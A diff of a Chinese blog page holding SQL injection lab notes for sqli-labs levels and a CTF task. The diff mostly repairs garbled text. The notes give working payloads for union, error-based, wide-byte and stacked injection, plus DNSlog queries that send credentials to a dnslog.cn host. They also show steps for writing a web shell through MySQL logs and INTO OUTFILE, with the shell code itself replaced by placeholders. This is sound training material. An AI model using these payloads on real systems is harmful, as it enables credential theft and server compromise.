@@ -5,12 +5,12 @@
   
   <title>SQL注入 | worny&#39;s Security Lab</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="??????????????? CTF ???????????????????? PHP shell ???????????&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;??????? PHP payload ?????????&lt;HEX_ENCODED_PHP_PAYLOAD_OMITTED_FOR_SAFETY&gt;?shell.php">
+  <meta name="description" content="安全声明：本文仅用于 CTF 学习与授权环境复现。可直接运行的 PHP shell 示例已替换为 &lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;。对应十六进制 PHP payload 已替换为 &lt;HEX_ENCODED_PHP_PAYLOAD_OMITTED_FOR_SAFETY&gt;。文中的危险脚本文件名发布时统一改为 output.t">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入">
 <meta property="og:url" content="https://worny666.github.io/2026/07/02/SQL%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="worny&#39;s Security Lab">
-<meta property="og:description" content="??????????????? CTF ???????????????????? PHP shell ???????????&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;??????? PHP payload ?????????&lt;HEX_ENCODED_PHP_PAYLOAD_OMITTED_FOR_SAFETY&gt;?shell.php">
+<meta property="og:description" content="安全声明：本文仅用于 CTF 学习与授权环境复现。可直接运行的 PHP shell 示例已替换为 &lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;。对应十六进制 PHP payload 已替换为 &lt;HEX_ENCODED_PHP_PAYLOAD_OMITTED_FOR_SAFETY&gt;。文中的危险脚本文件名发布时统一改为 output.t">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://worny666.github.io/images/sql-injection/pasted-image-20260326181325.png">
 <meta property="og:image" content="https://worny666.github.io/images/sql-injection/pasted-image-20260326181602.png">
@@ -48,10 +48,10 @@
 <meta property="og:image" content="https://worny666.github.io/images/sql-injection/pasted-image-20260201194233.png">
 <meta property="og:image" content="https://worny666.github.io/images/sql-injection/pasted-image-20260201193510.png">
 <meta property="article:published_time" content="2026-07-02T13:02:55.000Z">
-<meta property="article:modified_time" content="2026-07-02T14:20:31.235Z">
+<meta property="article:modified_time" content="2026-07-02T15:24:30.975Z">
 <meta property="article:author" content="worny">
 <meta property="article:tag" content="SQL注入">
-<meta property="article:tag" content="Web??">
+<meta property="article:tag" content="Web安全">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://worny666.github.io/images/sql-injection/pasted-image-20260326181325.png">
   
@@ -243,7 +243,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web??</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -254,7 +254,7 @@
       
           
         <blockquote>
-<p>??????????????? CTF ??????????????<br>?????? PHP shell ???????????<code>&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</code>?<br>?????? PHP payload ?????????<code>&lt;HEX_ENCODED_PHP_PAYLOAD_OMITTED_FOR_SAFETY&gt;</code>?<br><code>shell.php</code> ??????? <code>output.txt</code>????????????????????</p>
+<p>安全声明：本文仅用于 CTF 学习与授权环境复现。<br>可直接运行的 PHP shell 示例已替换为 <code>&lt;PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY&gt;</code>。<br>对应十六进制 PHP payload 已替换为 <code>&lt;HEX_ENCODED_PHP_PAYLOAD_OMITTED_FOR_SAFETY&gt;</code>。<br>文中的危险脚本文件名发布时统一改为 <code>output.txt</code>，避免触发杀软或被误用为可执行脚本。</p>
 </blockquote>
 <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h4 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h4><ul>
 <li>1.寻找注入点： 通过提交测试Payload（如单引号或逻辑语句）观察页面反应，确认参数是否存在SQL注入风险及判断其类型（字符型&#x2F;数值型）。</li>
@@ -289,9 +289,9 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; ORDER BY 1-- </span><br></pre></td></tr></table></figure>
 <p><strong>系统表 sqlite_master</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; UNION SELECT 1, sql, 3 FROM sqlite_master--</span><br></pre></td></tr></table></figure>
-<p><img src="/images/sql-injection/pasted-image-20260326181325.png" alt="Pasted image 20260326181325"><br>分析<br>CREATE TABLE flaggggggggggg (id…, flag TEXT…)<br>知道：表名&#x3D;flaggggggggggg，字段名&#x3D;flag</p>
+<p><img src="/images/sql-injection/pasted-image-20260326181325.png" alt="pasted image 20260326181325"><br>分析<br>CREATE TABLE flaggggggggggg (id…, flag TEXT…)<br>知道：表名&#x3D;flaggggggggggg，字段名&#x3D;flag</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; UNION SELECT 1, flag, 3 FROM flaggggggggggg--</span><br></pre></td></tr></table></figure>
-<p><img src="/images/sql-injection/pasted-image-20260326181602.png" alt="Pasted image 20260326181602"></p>
+<p><img src="/images/sql-injection/pasted-image-20260326181602.png" alt="pasted image 20260326181602"></p>
 <p>或者先查询所有表</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; UNION SELECT 1,name,3 FROM sqlite_master WHERE type=&#x27;table&#x27;--</span><br></pre></td></tr></table></figure>
 <p>接着查结构</p>
@@ -327,21 +327,21 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; || extractvalue(1,concat(0x07, (select * from(select * from output b join output c)a), 0x07))#</span><br></pre></td></tr></table></figure>
 <h4 id="Cookie-注入"><a href="#Cookie-注入" class="headerlink" title="Cookie 注入"></a>Cookie 注入</h4><h4 id="User-Agent-注入"><a href="#User-Agent-注入" class="headerlink" title="User-Agent 注入"></a>User-Agent 注入</h4><h4 id="Refer-注入"><a href="#Refer-注入" class="headerlink" title="Refer 注入"></a>Refer 注入</h4><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>二次注入的原理，在第一次进行数据库插入数据的时候，使用了 addslashes 、get_magic_quotes_gpc、mysql_escape_string、mysql_real_escape_string等函数对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。<br>比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。<br>二次注入，可以概括为以下两步:</p>
 <p>第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。<br>第二步：引用恶意数据<br>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>
-<h5 id="sqli-labs-24"><a href="#sqli-labs-24" class="headerlink" title="sqli-labs-24"></a>sqli-labs-24</h5><p>查看源码pass_change.php<br><img src="/images/sql-injection/pasted-image-20260201143239.png" alt="Pasted image 20260201143239"><br>发现只有username没有过滤<br>注册一个账号admin’#        密码123<br><img src="/images/sql-injection/pasted-image-20260201143602.png" alt="Pasted image 20260201143602"><br>更换密码为1111<br><img src="/images/sql-injection/pasted-image-20260201143717.png" alt="Pasted image 20260201143717"><br>成功修改</p>
+<h5 id="sqli-labs-24"><a href="#sqli-labs-24" class="headerlink" title="sqli-labs-24"></a>sqli-labs-24</h5><p>查看源码pass_change.php<br><img src="/images/sql-injection/pasted-image-20260201143239.png" alt="pasted image 20260201143239"><br>发现只有username没有过滤<br>注册一个账号admin’#        密码123<br><img src="/images/sql-injection/pasted-image-20260201143602.png" alt="pasted image 20260201143602"><br>更换密码为1111<br><img src="/images/sql-injection/pasted-image-20260201143717.png" alt="pasted image 20260201143717"><br>成功修改</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&#x27;12345&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;123456&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/sql-injection/pasted-image-20260201144340.png" alt="Pasted image 20260201144340"><br>此时实际更改的是用户admin的密码，现在登录admin密码1111发现登录成功<br><img src="/images/sql-injection/pasted-image-20260201144739.png" alt="Pasted image 20260201144739"></p>
-<h4 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h4><p>由于tomcat和apache解析参数的顺序不同，当注入两个参数?id&#x3D;1&amp;id&#x3D;2，此时tomcat解析的是第一个参数，而apache解析的是第二个参数并且SQL语句也是在apache服务器上执行的，由此绕过tomcat的检测。<br><img src="/images/sql-injection/pasted-image-20260201155629.png" alt="Pasted image 20260201155629"></p>
-<h5 id="less29"><a href="#less29" class="headerlink" title="less29"></a>less29</h5><p><img src="/images/sql-injection/pasted-image-20260201155700.png" alt="Pasted image 20260201155700"><br>闭合方式为’<br>确定回显<br><img src="/images/sql-injection/pasted-image-20260201155758.png" alt="Pasted image 20260201155758"></p>
+<p><img src="/images/sql-injection/pasted-image-20260201144340.png" alt="pasted image 20260201144340"><br>此时实际更改的是用户admin的密码，现在登录admin密码1111发现登录成功<br><img src="/images/sql-injection/pasted-image-20260201144739.png" alt="pasted image 20260201144739"></p>
+<h4 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h4><p>由于tomcat和apache解析参数的顺序不同，当注入两个参数?id&#x3D;1&amp;id&#x3D;2，此时tomcat解析的是第一个参数，而apache解析的是第二个参数并且SQL语句也是在apache服务器上执行的，由此绕过tomcat的检测。<br><img src="/images/sql-injection/pasted-image-20260201155629.png" alt="pasted image 20260201155629"></p>
+<h5 id="less29"><a href="#less29" class="headerlink" title="less29"></a>less29</h5><p><img src="/images/sql-injection/pasted-image-20260201155700.png" alt="pasted image 20260201155700"><br>闭合方式为’<br>确定回显<br><img src="/images/sql-injection/pasted-image-20260201155758.png" alt="pasted image 20260201155758"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0&#x27;union select 1,2,(select group_concat(username,&#x27;:&#x27;,password) from users)--+</span><br></pre></td></tr></table></figure>
-<p><img src="/images/sql-injection/pasted-image-20260201155944.png" alt="Pasted image 20260201155944"></p>
+<p><img src="/images/sql-injection/pasted-image-20260201155944.png" alt="pasted image 20260201155944"></p>
 <h5 id="less30"><a href="#less30" class="headerlink" title="less30"></a>less30</h5><p>闭合方式为”</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-2&quot;%20union%20select%201,2,(select%20group_concat(username,%27:%27,password)%20from%20users)--+</span><br></pre></td></tr></table></figure>
-<p><img src="/images/sql-injection/pasted-image-20260201171257.png" alt="Pasted image 20260201171257"></p>
+<p><img src="/images/sql-injection/pasted-image-20260201171257.png" alt="pasted image 20260201171257"></p>
 <h5 id="less31"><a href="#less31" class="headerlink" title="less31"></a>less31</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=2&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/sql-injection/pasted-image-20260201171427.png" alt="Pasted image 20260201171427"><br>闭合方式为”)</p>
+<p><img src="/images/sql-injection/pasted-image-20260201171427.png" alt="pasted image 20260201171427"><br>闭合方式为”)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-2&quot;)%20union%20select%201,2,(select%20group_concat(username,%27:%27,password)%20from%20users)--+</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/sql-injection/pasted-image-20260201171514.png" alt="Pasted image 20260201171514"></p>
+<p><img src="/images/sql-injection/pasted-image-20260201171514.png" alt="pasted image 20260201171514"></p>
 <h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围）。因此我们在此想办法将’前面添加的\除掉</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df 吃掉 \。具体的原因是 urlencode(\&#x27;) = %5c%27，我们在%5c%27 前面添加%df，形成%df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此时%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。</span><br></pre></td></tr></table></figure>
 <ul>
@@ -350,21 +350,21 @@
 <li><strong>GBK规则</strong>：<code>223 + 92</code> → 合法汉字（具体字不重要）</li>
 <li><strong>结果</strong>：(92)被223“带走”，单引号(39)无人看管，直接闭合SQL语句</li>
 </ul>
-<h5 id="less32"><a href="#less32" class="headerlink" title="less32"></a>less32</h5><p><img src="/images/sql-injection/pasted-image-20260201161929.png" alt="Pasted image 20260201161929"><br>查看源码</p>
+<h5 id="less32"><a href="#less32" class="headerlink" title="less32"></a>less32</h5><p><img src="/images/sql-injection/pasted-image-20260201161929.png" alt="pasted image 20260201161929"><br>查看源码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现将\替换成\\，将&#x27;和&quot;分别替换成\&#x27;和\&quot;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df%27</span><br></pre></td></tr></table></figure>
-<p><img src="/images/sql-injection/pasted-image-20260201162140.png" alt="Pasted image 20260201162140"></p>
+<p><img src="/images/sql-injection/pasted-image-20260201162140.png" alt="pasted image 20260201162140"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df%27%20union%20select%201,database(),3%20--+</span><br></pre></td></tr></table></figure>
-<p><img src="/images/sql-injection/pasted-image-20260201163049.png" alt="Pasted image 20260201163049"></p>
+<p><img src="/images/sql-injection/pasted-image-20260201163049.png" alt="pasted image 20260201163049"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--+</span><br><span class="line">爆表</span><br></pre></td></tr></table></figure>
-<p><img src="/images/sql-injection/pasted-image-20260201163148.png" alt="Pasted image 20260201163148"></p>
+<p><img src="/images/sql-injection/pasted-image-20260201163148.png" alt="pasted image 20260201163148"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27;%20union%20select%201,2,(select%20group_concat(username,0x3a,password)%20from%20users)--+</span><br></pre></td></tr></table></figure>
-<p><img src="/images/sql-injection/pasted-image-20260201164833.png" alt="Pasted image 20260201164833"></p>
-<h5 id="less33"><a href="#less33" class="headerlink" title="less33"></a>less33</h5><p>使用addslashes()函数过滤<br><img src="/images/sql-injection/pasted-image-20260201165228.png" alt="Pasted image 20260201165228"><br>闭合方式为’</p>
+<p><img src="/images/sql-injection/pasted-image-20260201164833.png" alt="pasted image 20260201164833"></p>
+<h5 id="less33"><a href="#less33" class="headerlink" title="less33"></a>less33</h5><p>使用addslashes()函数过滤<br><img src="/images/sql-injection/pasted-image-20260201165228.png" alt="pasted image 20260201165228"><br>闭合方式为’</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&#x27;%20union%20select%201,2,(select%20group_concat(username,0x3a,password)%20from%20users)--+</span><br></pre></td></tr></table></figure>
 
-<h5 id="less34"><a href="#less34" class="headerlink" title="less34"></a>less34</h5><p><img src="/images/sql-injection/pasted-image-20260201170326.png" alt="Pasted image 20260201170326"></p>
+<h5 id="less34"><a href="#less34" class="headerlink" title="less34"></a>less34</h5><p><img src="/images/sql-injection/pasted-image-20260201170326.png" alt="pasted image 20260201170326"></p>
 <table>
 <thead>
 <tr>
@@ -401,7 +401,7 @@
 </tbody></table>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=admin&amp;submit=Submit&amp;uname=admin汉&#x27; union select 1,(select%20group_concat(username,0x3a,password)%20from%20users)#</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/sql-injection/pasted-image-20260201171157.png" alt="Pasted image 20260201171157"></p>
+<p><img src="/images/sql-injection/pasted-image-20260201171157.png" alt="pasted image 20260201171157"></p>
 <h5 id="less36"><a href="#less36" class="headerlink" title="less36"></a>less36</h5><p>函数为mysqli_real_escape_string，和addslashes函数功能差不多</p>
 <table>
 <thead>
@@ -433,15 +433,15 @@
 </tr>
 </tbody></table>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df%27%20union select 1,2,(select%20group_concat(username,0x3a,password)%20from%20users)--+</span><br></pre></td></tr></table></figure>
-<p><img src="/images/sql-injection/pasted-image-20260201172254.png" alt="Pasted image 20260201172254"></p>
+<p><img src="/images/sql-injection/pasted-image-20260201172254.png" alt="pasted image 20260201172254"></p>
 <h5 id="less37"><a href="#less37" class="headerlink" title="less37"></a>less37</h5><p>36的post</p>
-<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p><strong>堆叠注入是一种在 同一个注入点中连续执行多条 SQL 语句的攻击方式</strong><br>原因：分号（<code>;</code>）<br>UNION执行的语句类型是有限的，而堆叠注入可以执行任意语句<br>堆叠注入触发的条件很苛刻,因为堆叠注入原理就是通过结束符同时执行多条sql语句,这就需要服 务器在访问数据端时使用的是可同时执行多条sql语句的方法,比如php中**mysqli_multi_query()<strong>函数,这个函数在支持同时执行多条sql语句,而与之对应的</strong>mysqli_query()**函数一次只能执行一条sql语句,所以要想目标存在堆叠注入,在目标主机没有对堆叠注入进行黑名单过滤的情况下必须存在类似于<code>mysqli_multi_query()</code>这样的函数<br>和union联合注入的区别：堆叠注入可以实现包括但不限于select的SQL语句，而union联合注入只能使用select语句。<br><img src="/images/sql-injection/pasted-image-20260112194520.png" alt="Pasted image 20260112194520"></p>
+<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p><strong>堆叠注入是一种在 同一个注入点中连续执行多条 SQL 语句的攻击方式</strong><br>原因：分号（<code>;</code>）<br>UNION执行的语句类型是有限的，而堆叠注入可以执行任意语句<br>堆叠注入触发的条件很苛刻,因为堆叠注入原理就是通过结束符同时执行多条sql语句,这就需要服 务器在访问数据端时使用的是可同时执行多条sql语句的方法,比如php中**mysqli_multi_query()<strong>函数,这个函数在支持同时执行多条sql语句,而与之对应的</strong>mysqli_query()**函数一次只能执行一条sql语句,所以要想目标存在堆叠注入,在目标主机没有对堆叠注入进行黑名单过滤的情况下必须存在类似于<code>mysqli_multi_query()</code>这样的函数<br>和union联合注入的区别：堆叠注入可以实现包括但不限于select的SQL语句，而union联合注入只能使用select语句。<br><img src="/images/sql-injection/pasted-image-20260112194520.png" alt="pasted image 20260112194520"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例如</span><br><span class="line">?id=-1&#x27;;insert into users(id,username,password) values (&#x27;1&#x27;,&#x27;admin&#x27;,&#x27;123&#x27;)-- +</span><br></pre></td></tr></table></figure>
 <h5 id="less38"><a href="#less38" class="headerlink" title="less38"></a>less38</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27;insert%20into%20users(id,username,password)values(38,%27666%27,%27666%27)--+</span><br></pre></td></tr></table></figure>
-<p>再重新访问id&#x3D;38就可以看到自己设置的账户和密码了<img src="/images/sql-injection/pasted-image-20260201172956.png" alt="Pasted image 20260201172956"></p>
+<p>再重新访问id&#x3D;38就可以看到自己设置的账户和密码了<img src="/images/sql-injection/pasted-image-20260201172956.png" alt="pasted image 20260201172956"></p>
 <h5 id="less40"><a href="#less40" class="headerlink" title="less40"></a>less40</h5><p>发现注入点，闭合方式为’)，可以用堆叠注入来改密码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;);update users set password=&#x27;666&#x27; where username=&#x27;Dumb&#x27;--+</span><br></pre></td></tr></table></figure>
-<p><img src="/images/sql-injection/pasted-image-20260201173717.png" alt="Pasted image 20260201173717"><br><img src="/images/sql-injection/pasted-image-20260201173755.png" alt="Pasted image 20260201173755"></p>
+<p><img src="/images/sql-injection/pasted-image-20260201173717.png" alt="pasted image 20260201173717"><br><img src="/images/sql-injection/pasted-image-20260201173755.png" alt="pasted image 20260201173755"></p>
 <h4 id="DNSlog外带注入"><a href="#DNSlog外带注入" class="headerlink" title="DNSlog外带注入"></a>DNSlog外带注入</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原理：当我们输入域名时，会向DNS服务器解析获取IP，再通过IP访问，在这过程中DNS服务器会产生对域名请求解析的日志，比如此时存在一个域名为dnslog.cn.，要使用的payload为`whoami`.dnslog.cn，就可以通过DNS解析日志来获取到主机名</span><br></pre></td></tr></table></figure>
 
 <table>
@@ -568,28 +568,28 @@
 </li>
 </ul>
 <h5 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; AND load_file(concat(&#x27;\\\\&#x27;, hex(user()), &#x27;.8f890j.dnslog.cn/abc&#x27;))--+</span><br></pre></td></tr></table></figure>
-<p><img src="/images/sql-injection/pasted-image-20260201185400.png" alt="Pasted image 20260201185400"><br>十六进制解码<br><img src="/images/sql-injection/pasted-image-20260201185448.png" alt="Pasted image 20260201185448"><br>爆库名</p>
+<p><img src="/images/sql-injection/pasted-image-20260201185400.png" alt="pasted image 20260201185400"><br>十六进制解码<br><img src="/images/sql-injection/pasted-image-20260201185448.png" alt="pasted image 20260201185448"><br>爆库名</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and load_file(concat(&#x27;\\\\&#x27;,database(),&#x27;.8f890j.dnslog.cn/abc&#x27;))--+</span><br></pre></td></tr></table></figure>
-<p><img src="/images/sql-injection/pasted-image-20260201185652.png" alt="Pasted image 20260201185652"></p>
+<p><img src="/images/sql-injection/pasted-image-20260201185652.png" alt="pasted image 20260201185652"></p>
 <p>爆表名</p>
 <p>**注：**因为使用group_concat()函数拼接时默认使用’ , ‘进行拼接，dnslog无法解析，所以这里有两种方法可以解决</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1、转为16进制，</span><br><span class="line"></span><br><span class="line">2、使用separator &quot;_&quot;  使用下划线连接</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;  and load_file(concat(&#x27;\\\\&#x27;,(select group_concat(table_name separator &#x27;_&#x27;) from information_schema.tables where table_schema=database()),&#x27;.8f890j.dnslog.cn/abc&#x27;))--+</span><br></pre></td></tr></table></figure>
-<p><img src="/images/sql-injection/pasted-image-20260201185949.png" alt="Pasted image 20260201185949"></p>
+<p><img src="/images/sql-injection/pasted-image-20260201185949.png" alt="pasted image 20260201185949"></p>
 <p>爆列名</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; AND load_file(concat(&#x27;\\\\&#x27;, (SELECT group_concat(column_name separator &#x27;_&#x27;) FROM information_schema.columns WHERE table_schema=database() AND table_name=&#x27;users&#x27;), &#x27;.8f890j.dnslog.cn/abc&#x27;))--+</span><br></pre></td></tr></table></figure>
-<p><img src="/images/sql-injection/pasted-image-20260201190341.png" alt="Pasted image 20260201190341"></p>
+<p><img src="/images/sql-injection/pasted-image-20260201190341.png" alt="pasted image 20260201190341"></p>
 <p>获取数据</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; AND load_file(concat(&#x27;\\\\&#x27;, (SELECT concat(username, &#x27;_&#x27;, password) FROM security.users LIMIT 0,1), &#x27;.8f890j.dnslog.cn/abc&#x27;))--+</span><br></pre></td></tr></table></figure>
-<p><img src="/images/sql-injection/pasted-image-20260201190616.png" alt="Pasted image 20260201190616"></p>
+<p><img src="/images/sql-injection/pasted-image-20260201190616.png" alt="pasted image 20260201190616"></p>
 <h4 id="SQL写马"><a href="#SQL写马" class="headerlink" title="SQL写马"></a>SQL写马</h4><h5 id="日志写马"><a href="#日志写马" class="headerlink" title="日志写马"></a><strong>日志写马</strong></h5><p>我们所有的数据库的都有一个存放日志的文件，这个文件可以会进行记录数据库的操作语句，也可能不会记录数据库的操作语句，这却决于两个全局变量：</p>
 <p>general_log&#x3D;&#x3D;&gt;日志保存状态，有两个状态，ON代表开启 OFF代表关闭。</p>
 <p>general_log_file&#x3D;&#x3D;&gt; 日志的保存路径。</p>
-<p><code>SET GLOBAL general_log=&#39;ON&#39;;</code> 打开日志记录<br>set global general_log_file&#x3D;’D:\phpstudy_pro\WWW\log.php’; 写马，这里需要注意的就是需要使用双斜线，然后还有就是日志文件必须是.php文件防止不能被解析<br>设置完毕之后就是代表着所有的执行语句都会记录到日志文件当中，不管执行成功与否。<br>select ‘<PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY>‘; publish-safe placeholder.</p>
-<h5 id="mysql-into-outfile注射一句话木马"><a href="#mysql-into-outfile注射一句话木马" class="headerlink" title="mysql into outfile注射一句话木马"></a><strong>mysql into outfile注射一句话木马</strong></h5><p>secure_file_priv&#x3D;””就是可以into outfile写入任意磁盘文件<br>十六进制编码<br><img src="/images/sql-injection/pasted-image-20260201194233.png" alt="Pasted image 20260201194233"></p>
+<p><code>SET GLOBAL general_log=&#39;ON&#39;;</code> 打开日志记录<br>set global general_log_file&#x3D;’D:\phpstudy_pro\WWW\log.php’; 写马，这里需要注意的就是需要使用双斜线，然后还有就是日志文件必须是.php文件防止不能被解析<br>设置完毕之后就是代表着所有的执行语句都会记录到日志文件当中，不管执行成功与否。<br>select ‘<PHP_WEB_SHELL_PAYLOAD_OMITTED_FOR_SAFETY>‘; 查询语句，其实就是写马，让日志文件众留下这样一句查询语句。那么可以使用这个木马</p>
+<h5 id="mysql-into-outfile注射一句话木马"><a href="#mysql-into-outfile注射一句话木马" class="headerlink" title="mysql into outfile注射一句话木马"></a><strong>mysql into outfile注射一句话木马</strong></h5><p>secure_file_priv&#x3D;””就是可以into outfile写入任意磁盘文件<br>十六进制编码<br><img src="/images/sql-injection/pasted-image-20260201194233.png" alt="pasted image 20260201194233"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;select &lt;HEX_ENCODED_PHP_PAYLOAD_OMITTED_FOR_SAFETY&gt;%20into outfile&#x27;X:/phpstudy_pro/WWW/sqli-labs-master/Less-50/output.txt&#x27;--+</span><br></pre></td></tr></table></figure>
-<p><img src="/images/sql-injection/pasted-image-20260201193510.png" alt="Pasted image 20260201193510"></p>
+<p><img src="/images/sql-injection/pasted-image-20260201193510.png" alt="pasted image 20260201193510"></p>
 
       
       
@@ -602,7 +602,7 @@
         <p><span>本文标题:</span><a href="/2026/07/02/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></p>
         <p><span>文章作者:</span><a href="/" title="访问  的个人博客"></a></p>
